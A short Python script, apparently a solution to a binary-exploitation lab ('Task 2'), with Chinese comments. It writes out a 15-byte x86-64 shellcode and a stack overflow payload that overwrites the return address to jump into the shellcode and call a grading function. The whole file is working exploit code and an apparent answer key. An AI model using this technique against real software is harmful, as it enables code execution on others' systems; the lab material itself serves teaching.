#!/usr/bin/env python3
"""Task 2: 把 15 字节 shellcode 放进栈上,返回地址跳到固定栈(可读可执行)."""
import sys
GRADE_EVAL = 0x401A87
FIXED_RET  = 0x721000800FD0                     # input() 里 gets 处 rsp 的固定值
sc  = b"\x6a\x04"                               # push $0x4  (避开 mov edi 的 0x0a)
sc += b"\x5f"                                   # pop  %rdi  -> grade_eval 参数=4
sc += b"\x48\xb8" + GRADE_EVAL.to_bytes(8, "little")  # movabs $grade_eval,%rax
sc += b"\xff\xd0"                               # call *%rax
assert len(sc) == 15 and b"\x0a" not in sc
payload  = sc + b"\x90"                         # shellcode 落在 rbp-0x10 (buffer 首地址)
payload += b"\x00" * 8                          # saved rbp
payload += FIXED_RET.to_bytes(8, "little")      # 返回地址 -> 栈上 shellcode
sys.stdout.buffer.write(payload)
